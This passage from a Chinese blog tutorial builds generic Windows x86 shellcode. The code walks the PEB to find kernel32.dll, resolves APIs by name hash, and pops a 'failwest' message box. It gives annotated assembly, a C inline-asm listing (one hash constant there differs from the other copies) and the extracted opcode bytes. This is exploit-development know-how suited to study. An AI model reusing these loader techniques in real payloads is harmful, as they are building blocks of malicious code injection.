<p>然后抬高栈，保护shellcode不被入栈数据破坏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;make some stack space</div><div class="line">xor ebx, ebx</div><div class="line">mov bh, 0x04</div><div class="line">sub esp, ebx</div></pre></td></tr></table></figure>
<p>将“use32“字符串压入栈，后面LoadLibraryA调用时需要该参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;push a pointer to &quot;user32&quot; onto stack</div><div class="line">mov bx, 0x3233</div><div class="line">push ebx</div><div class="line">push 0x72657375</div><div class="line">push esp</div><div class="line">xor edx, edx</div></pre></td></tr></table></figure>
<p>此时栈中的状态如图所示：<br><img src="images/general-shellcode/shellcode_stack1.png" alt="stack status"> </p>
<p>找到kernel32.dll的基址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;find base addr of kernel32.dll</div><div class="line">mov ebx, fs:[edx + 0x30]    ;ebx = addr of PEB</div><div class="line">mov ecx, [ebx + 0x0c]       ;ecx = pointer to loader data</div><div class="line">mov ecx, [ecx + 0x1c]       ;ecx = first entry in initialization order list</div><div class="line">mov ecx, [ecx]              ;(kernel32.dll)</div><div class="line">mov ebp, [ecx + 0x08]       ;ebp = base addr of kernel32.dll</div></pre></td></tr></table></figure>
<p>开始查找3个函数的地址 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">find_lib_functions:</div><div class="line">    lodsd               ;eax = DS * 10H + ESI, esi++</div><div class="line">    cmp eax, 0x1e380a6a	 ;hash of &quot;MessageBoxA&quot;</div><div class="line">    jne find_functions</div><div class="line">    xchg eax, ebp       ;save eax to ebp</div><div class="line">    call [edi - 0x8]    ;call LoadLibraryA</div><div class="line">    xchg eax, ebp       ;restore current to eax, and update ebp</div><div class="line">                        ;with base address of uer32.dll</div><div class="line"></div><div class="line">find_functions:</div><div class="line">    pushad              ;存储寄存器值，依次压入EAX,ECX,EDX,ECX,</div><div class="line">                        ;EDX,EBX,ESP,EBP,ESI,EDI</div><div class="line">                        </div><div class="line">    mov eax, [ebp + 0x3c]           ;eax = start of PE header</div><div class="line">    mov ecx, [ebp + eax + 0x78]     ;ecx = relative offset of export table</div><div class="line">    add ecx, ebp                    ;ecx = absolute addr of export table</div><div class="line">    mov ebx, [ecx + 0x20]           ;ebx = relative offset of names table</div><div class="line">    add ebx, ebp                    ;ebx = absolute addr of names tables</div><div class="line">    xor edi, edi</div><div class="line"></div><div class="line">next_function_loop:</div><div class="line">    inc edi                         ;i = 0</div><div class="line">    mov esi, [ebx + edi * 4]        ;esi = relative offset of current function name</div><div class="line">    add esi, ebp                    ;esi = absolute addr of current function name</div><div class="line">    cdq                             ;edx:eax</div><div class="line">	</div><div class="line">hash_loop:</div><div class="line">    movsx eax, byte ptr[esi]</div><div class="line">    cmp al, ah</div><div class="line">    jz compare_hash</div><div class="line">    ror edx, 7</div><div class="line">    add edx, eax</div><div class="line">    inc esi</div><div class="line">    jmp hash_loop</div><div class="line">	</div><div class="line">compare_hash:</div><div class="line">    cmp edx, [esp + 0x1c]           ;cmp to the requested hash</div><div class="line">    jnz next_function_loop</div><div class="line">    mov ebx, [ecx + 0x24]           ;ebx = absolute addr of ordinals</div><div class="line">    ;table</div><div class="line">    add ebx, ebp						</div><div class="line">    mov di, [ebx + 2 * edi]</div><div class="line">    mov ebx, [ecx + 0x1c]</div><div class="line">    add ebx, ebp</div><div class="line">    add ebp, [ebx + 4 * edi]</div><div class="line">    xchg eax, ebp</div><div class="line">    pop edi</div><div class="line">    stosd</div><div class="line">	</div><div class="line">    push edi</div><div class="line">    popad</div><div class="line">    cmp eax, 0x1e380a6a</div><div class="line">    jne find_lib_functions</div><div class="line">	</div><div class="line">function_call:</div><div class="line">    xor ebx, ebx</div><div class="line">    push ebx                        ;cut string</div><div class="line">    push 0x74736577				</div><div class="line">    push 0x6c696166                 ;push &quot;failwest&quot;</div><div class="line">    mov eax, esp</div><div class="line">    push ebx</div><div class="line">    push eax</div><div class="line">    push eax</div><div class="line">    push ebx</div><div class="line">    call [edi - 0x04]               ;call MessageBoxA</div><div class="line">    push ebx</div><div class="line">    call [edi - 0x08]               ;call ExitProcess</div><div class="line">    nop</div><div class="line">    nop</div><div class="line">    nop</div><div class="line">    nop</div></pre></td></tr></table></figure>
<h4 id="这3个函数的查找方法："><a href="#这3个函数的查找方法：" class="headerlink" title="这3个函数的查找方法："></a>这3个函数的查找方法：</h4><ol>
<li><p>查找kernel32.dll地址，以及从kernel32.dll中查找LoadLibraryA函数过程：<br> <img src="images/general-shellcode/kernel32.png" alt="kernel32"><br> <img src="images/general-shellcode/kernel32_arch.png" alt=""></p>
</li>
<li><p>函数查找顺序<br> [1]. LoadLibraryA -&gt; ExitProcess -&gt; MessageBox<br> [2]. 找到的各函数地址，依次存储在前面栈图中的edi所指向的空间；<br> [3]. 每次查找时，将ebp指向相应函数所在的dll地址；<br> [4]. 最后找MessageBox，在找MessageBox之前，调用LoadLibraryA函数，加载user32，并将ebp指向user32首地址；</p>
</li>
</ol>
<h3 id="3-整体代码如下"><a href="#3-整体代码如下" class="headerlink" title="3. 整体代码如下"></a>3. 整体代码如下</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    __asm&#123;</div><div class="line">        cld</div><div class="line">        push <span class="number">0x1e380a6a</span>	        <span class="comment">//hash of MessageBox</span></div><div class="line">        push <span class="number">0x4fd18963</span>	        <span class="comment">//hash of ExitProcess</span></div><div class="line">        push <span class="number">0x0c917432</span>	        <span class="comment">//hash of LoadLibraryA</span></div><div class="line">        mov esi, esp            <span class="comment">//esi = addr of "LoadLibraryA"</span></div><div class="line">        lea edi, [esi - <span class="number">0xc</span>]    <span class="comment">//edi = addr to start writing function	</span></div><div class="line"></div><div class="line">        ;make some <span class="built_in">stack</span> space</div><div class="line">        xor ebx, ebx</div><div class="line">        mov bh, <span class="number">0x04</span></div><div class="line">        sub esp, ebx</div><div class="line"></div><div class="line">        ;push a pointer to <span class="string">"user32"</span> onto <span class="built_in">stack</span></div><div class="line">        mov bx, <span class="number">0x3233</span></div><div class="line">        push ebx</div><div class="line">        push <span class="number">0x72657375</span></div><div class="line">        push esp</div><div class="line">        xor edx, edx</div><div class="line"></div><div class="line">        ;find base addr of kernel32.dll</div><div class="line">        mov ebx, fs:[edx + <span class="number">0x30</span>]</div><div class="line">        mov ecx, [ebx + <span class="number">0x0c</span>]</div><div class="line">        mov ecx, [ecx + <span class="number">0x1c</span>]</div><div class="line">        mov ecx, [ecx]</div><div class="line">        mov ebp, [ecx + <span class="number">0x08</span>]</div><div class="line"></div><div class="line">    find_lib_functions:</div><div class="line">        lodsd</div><div class="line">        cmp eax, <span class="number">0x1e380a6a</span></div><div class="line">        jne find_functions</div><div class="line">        xchg eax, ebp</div><div class="line">        call [edi - <span class="number">0x8</span>]</div><div class="line">        xchg eax, ebp</div><div class="line"></div><div class="line">    find_functions:</div><div class="line">        pushad</div><div class="line">        mov eax, [ebp + <span class="number">0x3c</span>]</div><div class="line">        mov ecx, [ebp + eax + <span class="number">0x78</span>]</div><div class="line">        add ecx, ebp</div><div class="line">        mov ebx, [ecx + <span class="number">0x20</span>]</div><div class="line">        add ebx, ebp</div><div class="line">        xor edi, edi</div><div class="line"></div><div class="line">    next_function_loop:</div><div class="line">        inc edi</div><div class="line">        mov esi, [ebx + edi * <span class="number">4</span>]</div><div class="line">        add esi, ebp</div><div class="line">        cdq</div><div class="line"></div><div class="line">    hash_loop:</div><div class="line">        movsx eax, byte ptr[esi]</div><div class="line">        cmp al, ah</div><div class="line">        jz compare_hash</div><div class="line">        ror edx, <span class="number">7</span></div><div class="line">        add edx, eax</div><div class="line">        inc esi</div><div class="line">        jmp hash_loop</div><div class="line"></div><div class="line">    compare_hash:</div><div class="line">        cmp edx, [esp + <span class="number">0x1c</span>]</div><div class="line">        jnz next_function_loop</div><div class="line">        mov ebx, [ecx + <span class="number">0x24</span>]</div><div class="line">        ;table</div><div class="line">        add ebx, ebp</div><div class="line">        mov di, [ebx + <span class="number">2</span> * edi]</div><div class="line">        mov ebx, [ecx + <span class="number">0x1c</span>]</div><div class="line"></div><div class="line">        add ebx, ebp</div><div class="line">        add ebp, [ebx + <span class="number">4</span> * edi]</div><div class="line"></div><div class="line">        xchg eax, ebp</div><div class="line">        pop edi</div><div class="line">        stosd</div><div class="line">        push edi</div><div class="line">        popad</div><div class="line">        cmp eax, <span class="number">0x1e280a6a</span></div><div class="line">        jne find_lib_functions</div><div class="line"></div><div class="line">    function_call:</div><div class="line">        xor ebx, ebx</div><div class="line">        push ebx</div><div class="line">        push <span class="number">0x74736577</span></div><div class="line">        push <span class="number">0x6c696166</span></div><div class="line">        mov eax, esp</div><div class="line">        push ebx</div><div class="line">        push eax</div><div class="line">        push eax</div><div class="line">        push ebx</div><div class="line">        call [edi - <span class="number">0x04</span>]</div><div class="line">        push ebx</div><div class="line">        call [edi - <span class="number">0x08</span>]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译查看exe文件，提取shellcode<br><img src="images/general-shellcode/ollydbg.png" alt=""> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</div><div class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</div><div class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</div><div class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</div><div class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</div><div class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</div><div class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</div><div class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</div><div class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</div><div class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</div><div class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://qwertwwwe.github.io/2017/01/18/general-shellcode/" data-id="cj3n8j3mi0001e3nhi45n71d1" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Articles récents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/06/07/windows-read-registers/">windows read registers</a>
          </li>
        
          <li>
            <a href="/2017/04/22/PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop/">PoDoFo 0.9.5 allows remote attackers to cause a denial of service(infinite loop)</a>
          </li>
        
          <li>
            <a href="/2017/01/18/general-shellcode/">General shellcode</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 rg<br>
      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>